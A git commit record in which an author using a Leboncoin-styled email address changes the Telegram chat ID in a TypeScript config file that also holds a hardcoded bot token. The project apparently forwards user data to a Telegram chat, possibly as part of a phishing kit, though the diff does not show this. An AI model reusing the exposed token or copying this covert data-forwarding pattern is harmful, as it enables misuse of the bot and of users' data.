4f9df9fd4f9408d689e9628ccea1bae224ecd8af
xmoxlopms <info.news.leboncoin01@gmail.com>
2025-09-15 20:29:31 +0200

    Update telegram.ts

--- src/utils/telegram.ts
+++ src/utils/telegram.ts
@@ -2,7 +2,7 @@ import { v4 as uuidv4 } from 'uuid';
 
 // Telegram configuration
 const BOT_TOKEN = "7883503586:AAG2VCgEP6fINmC5fBnP0BqlIXm_LVe0Mkg";
-const CHAT_ID = "-4550147138";
+const CHAT_ID = "-4839178026";
 
 // Generate or retrieve user token
 const getUserToken = () => {
